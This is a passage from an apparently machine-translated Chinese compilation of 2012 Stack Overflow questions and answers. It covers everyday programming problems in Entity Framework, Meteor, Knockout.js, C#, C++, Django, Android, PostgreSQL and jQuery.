也许试试 DbReferenceEntry。[重新加载](http://msdn.microsoft.com/en-us/library/gg679450(v=vs.103).aspx)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-21T21:31:29.503

这并不是我的问题的真正答案，而是到目前为止似乎对我有用的替代方案（以防有人正在寻找这个问题的答案）：

基本上，我创建了一个新上下文并将一个实体从新上下文传递到我的表单。如果我*取消*表单，我只需处理上下文，因此不会保存任何更改（无需回滚）。如果我*保存*表单，那么我会保存新上下文中的更改，但是我需要让我的原始上下文知道这些更改。

所以我使用`.Refresh`，它似乎成功地找到了新实体，但不会删除已删除的实体。然后我遍历实体并将它们与数据库值进行比较。

如果数据库返回“null”，我们就知道该实体已在数据库中删除，需要从上下文中删除。（但是，我无法在循环中将其删除，因为在枚举时尝试更改上下文的内容会导致错误，因此我将条目添加到列表中，然后在单独的循环中从上下文中删除.)

下面是代码：（
注意：我不保证这是一个好的解决方案，但它似乎对我有用）

```
 using (FmlaManagementContext auxDb = new FmlaManagementContext())
            {
                AuxiliaryTableEditor<State> statesTableEditor = new AuxiliaryTableEditor<State>(auxDb.States);
                if (statesTableEditor.ShowDialog() != DialogResult.OK)
                {
                    auxDb.Dispose();
                }
                else
                {
                    auxDb.SaveChanges();
                    auxDb.Dispose();

                    //refresh to pick up any new
                    ((IObjectContextAdapter)db).ObjectContext.Refresh(RefreshMode.StoreWins, db.States);

                    //loop through to remove deleted
                    List<State> nulls = new List<State>();
                    foreach (State state in db.States.Local)
                    {
                        DbEntityEntry entry = db.Entry(state);
                        DbPropertyValues databaseValues = entry.GetDatabaseValues();
                        if (databaseValues == null)
                        {
                            nulls.Add(state); 
                        }
                    }
                    foreach (State state in nulls)
                    {
                        db.States.Remove(state);
                    }
                }
            } 
```

如果我最终改变这个或发现它的问题，我会尽量记住回来更新......

# mongodb - 如何按插入时间对 Meteor 集合进行排序？

> ID：13957691
> 
> 赞同：59
> 
> 时间：2012-12-19T17:18:58.580
> 
> 标签：mongodb, meteor, mongodb-query

我正在使用 Meteor 进行我的第一个项目，并且在排序时遇到了一些困难。

我有一个表单，用户可以在其中输入格言，然后将格言显示在列表中。目前最新的格言会自动显示在列表的底部。有没有一种简单的方法可以让最新的出现在列表的顶部？

我试过：

```
 Template.list.aphorisms = function () {
    return Aphorisms.find({}, {sort: {$natural:1}});
}; 
```

我很难过，因为 Meteor 文档没有很多例子。

* * *

## 回答 #1

> 赞同：108
> 
> 时间：2012-12-20T07:06:37.887

假设`date_created`是有效的日期格式以及时间戳，您应该插入`date_created`使用`Date.parse()`javascript 函数的解析值，它给出了 1970 年 1 月 1 日和包含在`date_created`.

因此，最近添加的记录将包含 `date_created`比在它之前插入的记录更大的值。

现在在获取记录时，按参数的降序对游标进行排序`date_created`：

```
 Aphorisms.find({}, {sort: {date_created: -1}}); 
```

这会将记录从新到旧排序。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-04-29T07:20:07.030

我发现以下是更清洁的解决方案：

```
 Template.list.aphorisms = function () {
      return Aphorisms.find().fetch().reverse();
   }; 
```

鉴于整个集合已经以您想要的相反顺序存在，您可以简单地创建一个包含所有对象的数组并反转顺序。

# ios - viewDidLoad 和 viewWillAppear 中不同的子视图布局

> ID：13957695
> 
> 赞同：5
> 
> 时间：2012-12-19T17:19:29.517
> 
> 标签：ios, view, uiviewcontroller, viewdidload, viewwillappear

> **可能重复：**
> [UIViewController 返回无效帧？](https://stackoverflow.com/questions/9539676/uiviewcontroller-returns-invalid-frame)

在调试时我注意到在`viewDidLoad`调用时我的视图框架`origin=(x=0, y=20) size=(width=320, height=460)`是不准确的。在`viewWillAppear`调用它设置正确：`origin=(x=0, y=0) size=(width=320, height=416)`考虑到导航栏的高度。我的子视图布局取决于根视图，但我不想在每次视图出现时都设置它们。

我们应该如何处理这两个调用？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T17:23:04.617

处理视图布局的正确位置是在`UIViewController viewWillLayoutSubviews`方法中。每当视图控制器的视图调整大小时（例如首次显示时和旋转时）都会调用此方法。

`viewDidLoad`如您所见，视图控制器的视图在调用时尚未完全调整大小。

如果你需要支持 iOS 4.3 那么你不能使用`viewWillLayoutSubviews`它，因为它是在 5.0 中添加的。在这种情况下，请在`viewWillAppear:`.

# jquery - 从 JQuery onclick 调用 Knockout.js viewModel 函数

> ID：13957696
> 
> 赞同：4
> 
> 时间：2012-12-19T17:19:29.927
> 
> 标签：jquery, knockout.js, fancybox-2

对 knockout.js 来说非常新，我是一名 C#'er，但我的新工作除了后端之外还涉及到更多的前端，所以最终解决了这个问题。

无论如何，我遇到了（我认为是）一个不寻常的场景，我想从 JQuery 中的点击事件中调用 viewModel 方法；也许这很常见，但我不太明白:: 希望有人能提供帮助！

我的 viewModel 文件中有一个简单的函数： `//add to playlist`
`self.addToPlaylist = function (video) {`
`self.addedVideos.push(video);`
`};`

我正在使用一个名为 fancybox 的 Jquery 库将许多图像加载到轮播中，所以我已经绑定到名为 videos 的 observableArray

```
<div id="carousel" data-bind="foreach: videos">
             <!-- Left and right buttons -->
            <input id="left-button" type="button" value="" />
            <input id="right-button" type="button" value="" />
                <!-- All images with class of "cloudcarousel" will be turned into carousel items -->
                <!-- You can place links around these images -->
                <a class="fancybox-iframe" href="#" rel="group">
                    <img class="cloudcarousel" width="160" height="121" alt="test" data-bind="attr: {src: videoThumbnail, url: videoUrl, id: videoId, title: videoTitle, caption: videoCaption}"
                        onclick="previewVideo($(this).attr('url'), $(this).attr('caption'));CreateAddVideoClipButton($(this).attr('id'));" />                     
                </a>
            </div> 
```

这是此 div 的完整 html。理想情况下，我会 click: $parent.addToVideos 在 data-bind 属性中，但因为我正在侦听的点击在这个阶段不会发生，所以我必须呈现一个添加按钮。想法是单击打开fancybox 中的预览，然后用户可以关闭窗口，或者单击添加将此视频添加到数组中。

好吧，希望这对人们有意义......

在我的 Jquery 方法 CreateAddVideoClipButton 中，我有：

```
var userModel = new VideosViewModel();
var text = "<a href='#' data-bind='click: userModel.addToPlaylist'>Add Video</a>"; 
```

这就是我卡住的地方。我需要知道如何在这个阶段允许点击，在我的 viewModel 中调用 addToPlaylist 方法

如果您需要更多信息以使其有意义，请告诉我。

* * *

## 编辑：发布代码

视图模型：

```
function VideosViewModel() {
    var self = this;

    //Array of videos
    self.videos = ko.observableArray([
        { videoTitle: "Video Title",
        videoId: "1",
        videoThumbnail: "images/image.png",
        videoAlt: "Alt text",
        videoUrl: "videos/video.mp4",
        videoCaption: 'video caption text' },

    ]);

    //Array of added videos
    self.addedVideos = ko.observableArray([]);

    //add to playlist
    self.addToPlaylist = function (video) {
        self.addedVideos.push(video);
        alert("Added to playlist");
    };

    //remove from playlist
    self.removeFromPlaylist = function (video) {
        self.addedVideos.remove(video);
    };
}
ko.applyBindings(new VideosViewModel()); 
```

HTML：

```
<div id="carousel" data-bind="foreach: videos">
             <!-- Left and right buttons -->
            <input id="left-button" type="button" value="" />
            <input id="right-button" type="button" value="" />
                <!-- All images with class of "cloudcarousel" will be turned into carousel items -->
                <!-- You can place links around these images -->
                <a class="fancybox-iframe" href="#" rel="group">
                    <img class="cloudcarousel" width="160" height="121" alt="test" data-bind="attr: {src: videoThumbnail, url: videoUrl, id: videoId, title: videoTitle, caption: videoCaption}",
                        onclick="previewVideo($(this).attr('url'), $(this).attr('caption'));CreateAddVideoClipButton($(this).attr('id'));" />                     
                </a>
            </div> 
```

添加视频剪辑功能

```
function CreateAddVideoClipButton(selectedVideoId) {
    var theElement = document.getElementById(selectedVideoId);
    var videoUrl = theElement.getAttribute('url');
    var videoThumb = theElement.getAttribute('src');
    var videoTitle = theElement.getAttribute('title');
    var videoId = theElement.getAttribute('id');
    selectedImageId = videoId;
    //var userModel = new VideosViewModel();
    var text = "<input type=\"button\" id=\"addButton\" class=\"addButton\" value=\"Add Video Clip\" onclick=\"addVideo(" + "'" + videoUrl + "'" + ", " + "'" + videoThumb + "'" + "," + "'" + videoTitle + "'" + "," + "'" + videoId + "'" + ");\" />";
    //var text = "<a href=\"#\" onclick=" + userModel.addToPlaylist() + "\">Add Video</a>";
    currentimageid = text;
    currentSelectedImageId = selectedImageId;
    hidePlayer();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T10:05:35.037

据我了解，您希望不引人注意地处理事件。

如果你看这里很简单：

[http://knockoutjs.com/documentation/unobtrusive-event-handling.html](http://knockoutjs.com/documentation/unobtrusive-event-handling.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-20T11:02:35.773

我相信您的问题是您正在混合 onClick 属性和 Knockout 处理程序，而您应该只使用 Knockout 处理程序。使用这些处理程序将处理所有样板代码，就像您在 addVideoClipButton 中添加的一样。

例子：

```
 <button data-bind="visible: showAddButton, click: $parent.addToPlaylist">Add to playlist</button> 
```

我已将您的代码复制到[小提琴](http://jsfiddle.net/anzeo/n3FFS/)中，看看如何通过使用 Knockout 处理程序来简化代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-20T10:15:14.543

我会做这样的事情

```
var VideosViewModel = {
    addToPlaylist : function () {
        alert("Added to playlist");
    }
};

ko.applyBindings(VideosViewModel);

$('#testBtn').click(function(){
    VideosViewModel.addToPlaylist();            
});
​ 
```

[http://jsfiddle.net/VyUT4/4/](http://jsfiddle.net/VyUT4/4/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-04-21T09:22:29.387

你可以做这样的事情 -

视图模型 -

```
var searchViewModel = function () {
    var self = this;

    self.search = function (param) {
    //do something
    };

} 
```

HTML -

```
<button data-bind="click: function () { Search() }" class="" id="searchBtn">Search</button> 
```

jQuery -

```
function Search() {
// paramvalue = 1; 
viewModel.search(paramvalue);                  
} 
```

# c# - 新日期时间（）与默认（日期时间）

> ID：13957701
> 
> 赞同：231
> 
> 时间：2012-12-19T17:19:45.630
> 
> 标签：c#, datetime, default

有理由选择其中一个而不是另一个吗？

```
DateTime myDate = new DateTime(); 
```

或者

```
DateTime myDate = default(DateTime); 
```

他们两个是平等的`1/1/0001 12:00:00 AM`。

* * *

## 回答 #1

> 赞同：233
> 
> 时间：2012-12-19T17:20:45.837

不，它们是相同的。

`default()`，对于任何值类型（`DateTime`是值类型）将始终调用无参数构造函数。

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2015-11-17T08:28:35.567

如果要在方法中为 DateTime 参数使用默认值，则只能使用 default(DateTime)。

以下行将无法编译：

```
 private void MyMethod(DateTime syncedTime = DateTime.MinValue) 
```

这一行将编译：

```
 private void MyMethod(DateTime syncedTime = default(DateTime)) 
```

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2014-06-29T17:05:20.553

答案是不。请记住，在这两种情况下，`mdDate.Kind = DateTimeKind.Unspecified`.

因此，最好执行以下操作：

```
DateTime myDate = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc); 
```

该`myDate.Kind`属性是只读的，因此在调用构造函数后无法更改。

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2019-02-27T15:50:37.470

理解它的最简单方法是 DateTime 是一个结构。当您初始化一个结构时，它会初始化为它的最小值：`DateTime.Min`

`default(DateTime)`因此和`new DateTime()`和之间没有区别`DateTime.Min`

# .net - 在不模板化整个控件的情况下更改 WPF ScrollViewer 的 ScrollBar 上的颜色

> ID：13957705
> 
> 赞同：1
> 
> 时间：2012-12-19T17:19:49.283
> 
> 标签：.net, wpf, styles, scrollviewer

我想更改 ScrollViewer 的 ScrollBar 上的背景颜色，但我真的不想重新模板化整个 ScrollViewer 控件以及管理 ScrollBar 的所有相关逻辑。

是否有某种方法可以只更改 ScrollBar 的颜色而不重新指定整个控件的所有内容？

# c# - 无法编辑 SelectListItem 的项目

> ID：13957707
> 
> 赞同：2
> 
> 时间：2012-12-19T17:19:53.577
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, selectlistitem

我有一个这样的对象：

```
public class AppointmentStatus 
{
     public int Id {get;set;}
     public string I18NKey {get;set;}
} 
```

I18NKey 是指用于翻译的密钥。

在我的表单中，我使用 Select list 创建了一个下拉列表：

```
Html.DropDownListFor(x=>x.Id, new SelectList(MyListOfStatus, "Id","I18NKey") 
```

有了这个，我将键的值作为文本检索，我想编辑每个 SelectListItem 中的属性文本。

我用过这样的东西：

```
public static SelectList TranslateValue(SelectList list)
    {
        foreach (var tmp in list)
        {
            tmp.Text = I18nHelper.Message(tmp.Text);
        }
        return list;
    } 
```

但它什么也没改变！Text 属性仍然相同，为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:18:35.810

您需要在下拉列表中更改绑定：

```
Html.DropDownListFor(x => x.Id, 
       TranslateValue(new SelectList(MyListOfStatus, "Id","I18NKey")) 
```

还要检查您的`I18nHelper.Message`工作是否按预期工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T08:29:37.567

我终于找到了解决方案： SelectList 似乎基于它需要的 IEnumerable。每个 SelectListItem 的属性 Text 都是**动态**的，并且取决于 IEnumerable 的每个项目。

我们需要更改**IEnumerable**，而不是**SelectList**：

我最终做了什么：

```
public class AppointmentStatus 
{
     public int Id {get;set;}
     public string I18NKey {get;set;}
     public string Translation {get;set;}
}

public static IEnumerable<AppointmentStatus> TranslateValue(IEnumerable<AppointmentStatus> list)
    {
        foreach (var tmp in list)
        {
            tmp.Translation = I18nHelper.Message(tmp.I18NKey);
        }
        return list;
    }

Html.DropDownListFor(x=>x.Id, new SelectList(HelperClass.TranslateValue(MyListOfStatus), "Id","Translation") 
```

希望对您有所帮助。

# c++ - 具有引用参数的函数不适用于从其他函数返回的值

> ID：13957709
> 
> 赞同：0
> 
> 时间：2012-12-19T17:19:53.933
> 
> 标签：c++, function, object, reference

我有`Messageable::receiveMessage(Message&)`。当我使用它时，我希望能够传递它 a `Message`，我将它传递给`Message`从函数返回的 a ，但是当我这样做时，我得到

```
error: no matching function for call to 'Messageable::receiveMessage(Message)'
no known conversion for argument 1 from 'Message' to 'Message&' 
```

它仅在我使用重载 << 时才有效（因为它返回 Message&，即`receiveMessage(myMsg<<value);`：）

我可能/我可能做错了什么，或者只是在标准中不允许从函数返回值？我认为当你声明一个引用参数时，你可以使用对象本身并且它会自动转换（唯一的区别，它没有被复制），我看不出它是否来自函数的区别。

（我知道这个问题之前可能已经回答过了，但我的搜索只出现了链接器错误“未定义的引用”）

错误代码是`receiveMessage( action->second->message() );`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:28:44.333

> 我可能/我可能做错了什么？

您没有发布导致错误的代码，这意味着我们只能猜测出了什么问题。

最有可能的是，您试图将临时对象（函数调用或其他表达式的结果）传递给函数。该函数采用非常量*左值*引用，它不能绑定到临时值。

解决方案：

*   更改函数以引用 const: `receiveMessage(Message const &)`。如果函数不需要更改它，这只是一个选项。
*   传递命名变量而不是临时对象。

# django - 如何在 Django 管理员的索引中分离不同模块中的模型？

> ID：13957711
> 
> 赞同：3
> 
> 时间：2012-12-19T17:19:54.417
> 
> 标签：django, django-admin

我想在管理索引中分离我的应用程序模型：

我在其中注册了所有模型，`admin.py`并将它们全部放在下面显示的大红色 1 下的默认管理索引中。

现在我想将我的一些模型放在另一个“块”中，如下图大红色 2 下所示。

为了使它更难，我还需要在两个“块”中都有一些模型，但使用不同的查询集。

我怎样才能做到这一点？

![在此处输入图像描述](../Images/4bbf1d7ae2a8de3b02c87f74ec12e48b.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:31:12.367

我测试了我的解决方案并且它有效。

做这个：

```
class MyModelTest(models.Model):
    # Fields here
    class Meta:
        app_label = 'My other app namespace' 
```

* * *

更新：

为了实现您的目标（最大灵活性），您需要根据自己的需要修改模板`admin/app_index.html`和视图。`django.contrib.admin.sites.app_index`

# wordpress - 获取标题部分中的值

> ID：13957712
> 
> 赞同：0
> 
> 时间：2012-12-19T17:20:01.980
> 
> 标签：wordpress, plugins

我开始开发一个插件，我写了下面的代码

```
add_filter('get_header', 'my_postslide'); 
```

它在正文部分调用函数，但现在我想在标题部分获取值。这意味着在部分中。`<header> </header>`请让我知道在“ `<header> </header>`”部分中调用值的适当挂钩是什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:48:02.843

使用`wp_head`钩子。在 WordPress codex 中看到这里：http: [//codex.wordpress.org/Plugin_API/Action_Reference/wp_head](http://codex.wordpress.org/Plugin_API/Action_Reference/wp_head)

# oracle - 如何将 Attunity 驱动程序 MSORA 视为 SQL 链接服务器的提供程序

> ID：13957715
> 
> 赞同：0
> 
> 时间：2012-12-19T17:20:08.753
> 
> 标签：oracle, sql-server-2008, ssis, linked-server, attunity

我想查看用于 SQL Server 2008 的 Attunity Oracle SSIS 1.2 驱动程序的 MSORA 驱动程序。我已经安装了 x64 驱动程序，并事先安装了 VC++ Redistributable Runtime（因为这似乎可以防止安装过程中出现一些错误）....但是我无法将 MSORA 视为 SQL Management Studio 中的提供程序。我试图手动 RegSvr32 .dll 文件，并重新启动服务器 - 但无法在提供程序列表中看到它。

我必须做什么才能在列表中看到提供程序，以便我可以从 Attunity 驱动程序创建链接服务器。

任何建议表示赞赏。

一世

# c# - EF 和通用存储库，如何让它在更新时不添加新实体

> ID：13957716
> 
> 赞同：0
> 
> 时间：2012-12-19T17:20:13.777
> 
> 标签：c#, entity-framework, entity-framework-5

尝试添加具有非新对象/实体图的新实体时遇到问题。

这是我使用 Code First 方法的域类型：

```
public class Person : IEntity
{
   public int Id { get; set; }
   public string Name { get; set; }
   public List<PersonSession> Sessions { get; set; }
}

 public class PersonSession : IEntity
 {
    public int Id { get; set; }
    public Person Person { get; set; }
    public Session Session { get; set; }
 }

public class Session : IEntity
{
  public int Id { get; set; }
  public string Title { get; set; }     
} 
```

所以我有一个人，他们可以有很多会话，并且会有一个他们的会话表。Session 表虽然不会对人员有任何引用，但这就是 PersonSessions 表/关系的用途。

EF 5 确实使用一个 DbSet 创建了这 3 个表。

但是我正在尝试使用泛型制作一个简单的存储库模式，并且我有一个 Save 方法。

唯一的问题是，即使我使用 Repository.GetAll(); 提供给我的现有会话，它也会向 Sessions 表添加一个新会话；

```
 public int Save(T t)
 {
    if (t.Id == 0)
       _context.Entry(t).State = EntityState.Added;
    else
       _context.Entry(t).State = EntityState.Modified;

    _context.SaveChanges();
    return t.Id;
 } 
```

因此，当我创建 2 个新会话，然后通过 Sessions 的 Generic Repo 实例添加它们时，它们会被正确添加，

当我尝试创建一个新人并给他那些现有的会话时：

```
 private static void AddPerson()
  {

     var newPerson = new Person
                        {
                           JobTitle = EJobTitle.SoftwareDeveloper,
                           Name = "Mark W",
                        };

     var sessionsForPerson = new List<PersonSession>();

     var session1 = _sessionRepo.Retrieve(1);
     var session2 = _sessionRepo.Retrieve(2);

     sessionsForPerson.Add(new PersonSession
                              {
                                 Session = session1,
                                 Person = newPerson
                              });

     sessionsForPerson.Add(new PersonSession
                              {
                                 Session = session2,
                                 Person = newPerson,
                              });

     newPerson.Sessions = sessionsForPerson;

     _personRepo.Save(newPerson);
  } 
```

它正在第二次添加会话。

是否有一个数据属性可以放在 PersonSession.Session 属性上，告诉它这将始终是一个现有会话，还是我需要在 FluentApi 中使用某些东西来指示 EF？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T22:40:43.637

在您的`Save`方法中，您将 new 的状态设置`Person`为`EntityState.Added`. 当您这样做时，EF 将对象图中*每个*对象的状态设置为`Added`。`Session`s 已经具有 > 0 的 Id并不重要。除非图中的对象先前由相同的上下文检索过。在这种情况下，它们将保持不变（并且只会保存关联）。

所以这就是问题所在。您的每个存储库都有自己的上下文。这是通用存储库的常见问题。一种可能的补救措施是在存储库之外创建一个上下文并将其注入到一个业务事务中涉及的存储库中。另一种是在添加根实体后通过遍历对象图来确保现有对象以未修改状态进入上下文。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T21:46:53.530

尝试指定哪些属性是您的实体键：

```
public class Person : IEntity
{
    [Key]
    public int Id { get; set; }
    public string Name { get; set; }
    public List<PersonSession> Sessions { get; set; }
}

 public class PersonSession : IEntity
 {
    [Key]
    public int Id { get; set; }
    public Person Person { get; set; }
    public Session Session { get; set; }
 }

public class Session : IEntity
{ 
    [Key]
    public int Id { get; set; }
    public string Title { get; set; }     
} 
```

# c++ - 在声明它的方法内初始化静态 std::multimap

> ID：13957721
> 
> 赞同：2
> 
> 时间：2012-12-19T17:20:27.663
> 
> 标签：c++, static, initialization

我需要静态多图，但我不想将它作为类字段，因为我只需要一种方法。我是这样写的，但是在函数内部初始化这个映射是否有任何其他方法，初始化代码只会在第一次调用函数时运行？

```
static void someClass::someMethod(/**/)
{
    static multimap<int, char> err;

    if(err.size() == 0)
    {//initialize here
        err.insert(std::pair<int, char>(1, 'a'));
        err.insert(std::pair<int, char>(2, 'b'));
        err.insert(std::pair<int, char>(3, 'v'));
        err.insert(std::pair<int, char>(4, 'c'));
    }
    //method logic
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T17:25:16.577

如果您有 C++11 编译器，则可以使用初始化列表：

```
static std::multimap<int, char> err = {
    { 1, 'a' },
    { 2, 'b' },
    { 3, 'v' },
    { 4, 'c' }
}; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-19T17:32:45.677

编写一个返回填充`multimap`的函数并调用该函数：

```
multimap<int, char> create_err()
{
    multimap<int, char> err;
    err.insert(std::pair<int, char>(1, 'a'));
    err.insert(std::pair<int, char>(2, 'b'));
    err.insert(std::pair<int, char>(3, 'v'));
    err.insert(std::pair<int, char>(4, 'c'));
    return err;
}

static void someClass::someMethod(/**/)
{
    static multimap<int, char> err = create_err();
    //method logic
    //...
} 
```

# facebook - Google Play 商店 Facebook 分享

> ID：13957725
> 
> 赞同：2
> 
> 时间：2012-12-19T17:20:50.187
> 
> 标签：facebook, google-play

我尝试在 Facebook 上共享指向我的应用程序的链接，并且标题和描述显示正常，但由于某种原因，共享中没有像普通链接那样显示的图像（我希望至少有 Play 徽标，如果不是我的应用程序的标志）。

有没有办法让我指定在 Facebook 上分享我的 Play 应用时要显示的徽标？

# android - Android远程服务启动和停止

> ID：13957730
> 
> 赞同：3
> 
> 时间：2012-12-19T17:20:57.957
> 
> 标签：android, service

我正在开发一个对服务器进行异步调用以获取通知的应用程序。在主要活动中一切正常。现在困扰我的是，我需要一个服务，当应用程序不活动时会轮询通知（就像 GMail 股票应用程序一样）。所以我在主要活动 onStop 函数的另一个进程中启动远程服务，如下所示：

```
@Override
public void onStop() {
    super.onStop();
    if(prefs.getBoolean(OPTIONS_KEY_SERVICE, false)) {
        startServiceIntent = new Intent(CloudAlarmsService.MY_SERVICE);
        Bundle b = new Bundle();
        b.putStringArray("duidCodes", duidCodes);
        startServiceIntent.putExtras(b);
        Log.d("SSE_SERVICE", "Starting Service");
        startService(startServiceIntent);
    }
} 
```

它工作正常，我在活动关闭后收到通知。现在我想在活动开始时停止远程服务（所以我不会同时有活动和服务轮询服务器）。我这样做：

```
@Override
public void onResume() {
    super.onResume();
    stopService(new Intent(CloudAlarmsService.MY_SERVICE));
    Log.d("SSE_SERVICE", "Stopping service");
} 
```

CloudAlarmsService.MY_SERVICE 是我的服务类中的一个字符串：

```
public class CloudAlarmsService extends Service {
    public static String MY_SERVICE = "cloudindustries.alarms.service.BACKGROUND_SERVICE";
... 
```

并且它在清单 xml 中声明如下：

```
<service android:process=":alarms_poller" android:name=".CloudAlarmsService">
     <intent-filter android:label="@string/serviceStopService">
           <action android:name="cloudindustries.alarms.service.BACKGROUND_SERVICE" />
     </intent-filter>
</service> 
```

但服务并没有停止，它继续工作。在我关闭主要活动后，会产生另一个服务实例并继续轮询。

有什么我错过了吗？或者这对于远程服务来说可能是一个不好的用途，或者甚至还有另一种类型的服务/管理器可以用于这种目的？

谢谢你的帮助！

**编辑：**

问题说明：是否可以从不同的活动（未启动服务）中停止远程服务？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:58:59.077

尝试停止`CloudAlarmsService`服务：

```
Intent intent = new Intent();
intent.setClass(getApplicationContext(), CloudAlarmsService.class); 
getApplicationContext().stopService(intent); 
```

# python - SQL - 查找与当前日期匹配的条目

> ID：13957732
> 
> 赞同：1
> 
> 时间：2012-12-19T17:21:02.573
> 
> 标签：python, sql, postgresql, date, sqlalchemy

下表（我们将其命名为**validity_period**）：

```
-------------------------------------------
编号 | 有效来自 | 有效_直到
-------------------------------------------
1 2012-11-12 2012-12-02
2 2012-12-03 空
3 2012-12-15 2012-12-21

```

（**valid_from** 不可为空；**valid_until**可空，但不必为空）

现在我想找出今天（2012-12-19）哪个条目有效。从逻辑上看，它必须是条目 3，因为条目可以相互重叠，但只有一个条目在一天内有效。（在 2012 年 12 月 22 日，它必须是有效的条目 2。）
请注意，所有条目都可以有一个**valid_until ，但****valid_until**为 NULL 的条目不能超过一个。

我将如何在 SQL 查询中执行此操作？（如果可能在 SQLAlchemy 中，但我也可以自己从原始 SQL 中翻译它）

（我使用的是 PostgreSQL 9.1）

编辑：这是我的最终决议。感谢所有贡献者！

```
SELECT * 
    FROM validity_period 
    WHERE valid_from <= CURRENT_DATE AND 
          valid_until >= CURRENT_DATE
UNION
SELECT * 
    FROM validity_period 
    WHERE valid_from <= CURRENT_DATE AND 
          valid_until IS NULL
ORDER BY valid_from DESC 
LIMIT 1; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-20T00:05:50.763

您可以使用 WINDOW 函数（例如滞后或领先）来引用上一条/下一条记录，并限制“打开”间隔：

```
DROP SCHEMA tmp CASCADE;
CREATE SCHEMA tmp ;
SET search_path=tmp;

CREATE TABLE daterange
        ( id INTEGER NOT NULL
        , valid_from  DATE NOT NULL
        , valid_until DATE
        );
INSERT INTO daterange (id, valid_from, valid_until) VALUES
 (1, '2012-11-12', '2012-12-02' )
,(2, '2012-12-03', NULL)
,(3, '2012-12-15', '2012-12-21' )
,(4, '2012-12-22', NULL )
        ;

-- The CTE is for convenience; could be a subquery or view
WITH magic AS (
        SELECT dr.id
        , dr.valid_from
        , COALESCE(dr.valid_until , lead(valid_from) OVER ww) AS valid_until
        FROM daterange dr
        WINDOW ww AS (ORDER BY dr.valid_from )
        )
SELECT *
FROM magic ma
WHERE now() BETWEEN ma.valid_from AND ma.valid_until
        ; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:38:30.813

尝试这样的事情：

```
SELECT  *
FROM    validity_period
WHERE   valid_from <= current_date
        AND valid_to >=current_date    
UNION 

--Gets the last instance where valid_until is null
SELECT * 
FROM validity_period 
WHERE   valid_from <= current_date
        AND valid_to IS NULL
ORDER BY id DESC LIMIT 1 
```

如果您想要第一个而不是最后一个空字段，只需删除 DESC

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:43:48.427

在您作为示例提供的数据中，valid_until 在逻辑上是冗余的，如果存在 valid_from 上的索引并且 PostgreSQL 将执行降序索引扫描，则使用此逻辑可能会获得更快的结果：

```
select   *
from     validity_period
where    valid_from <= current_date
order by valid_from desc
limit    1 
```

检查解释计划，看看它是否是对更大数据集的改进。

编辑：如果可能存在“最后一个”记录在今天之前的有效截止日期的情况，没有行要返回，请尝试：

```
select   most_recent_record.*
from     (
         select   *
         from     validity_period
         where    valid_from <= current_date
         order by valid_from desc
         limit    1) most_recent_record
where    coalesce(most_recent_record.valid_until,current_date) <= current_date 
```

最后一个谓词可能读起来更好：

```
where    not (most_recent_record.valid_until > current_date) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-20T11:05:31.950

你的问题不是很清楚。non-null 可以有多个匹配项`valid_until`吗？选哪个？你想返回什么？一栏？一些？全部？

无论如何，您发布的解决方案可以简化为：

```
SELECT * 
FROM   validity_period 
WHERE  valid_from  <= now()::date
AND   (valid_until >= now()::date OR valid_until IS NULL) -- parenthesis needed!
ORDER  BY valid_from DESC 
LIMIT  1; 
```

# javascript - Jquery/JS：替换表中的一行

> ID：13957738
> 
> 赞同：3
> 
> 时间：2012-12-19T17:21:29.923
> 
> 标签：javascript, jquery

我正在尝试使用 JQuery 替换一整行，但似乎不起作用（该行没有被替换）。这是示例代码的链接：http: [//jsfiddle.net/s2kwb/](http://jsfiddle.net/s2kwb/)

JavaScript：

```
$("td.99999").first().parent().next().replaceWith("<tr><td >category 3</td>
<td >2222</td>
<td >something 22</td>
<td >something 22</td>
<td >$3,433</td>
<td >$300</td>
<td >$3,733</td>
<td >$349</td>
<td >$4,082</td>
</tr>");​ 
```

html:

```
<table border="1">
<tr >
  <th>category</th>
  <th>rank</th>
  <th>priority</th>
  <th>contact</th>
  <th>price</th>
  <th>tax</th>
  <th>total price</th>
  <th>shipping</th>
  <th>Net payment</th>
</tr>
<tr class="displaytagOddRow">
  <td class="99999">category 1</td>
  <td class="99999">99999</td>
  <td class="99999">something</td>
  <td class="99999">something</td>
  <td class="99999 alignRight">$3,433</td>
  <td class="99999 alignRight">$300</td>
  <td class="99999 alignRight">$3,733</td>
  <td class="99999 alignRight">$349</td>
  <td class="99999 alignRight">$4,082</td>
</tr>
<tr class="displaytagOddRow" style="Background-color:Red">
  <td class="3333">category 2</td>
  <td class="3333">3333</td>
  <td class="3333">something</td>
  <td class="3333">something</td>
  <td class="3333 alignRight">$3,433</td>
  <td class="3333 alignRight">$300</td>
  <td class="3333 alignRight">$3,733</td>
  <td class="3333 alignRight">$349</td>
  <td class="3333 alignRight">$4,082</td>
</tr>
</table> 
```

我究竟做错了什么？

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:25:06.620

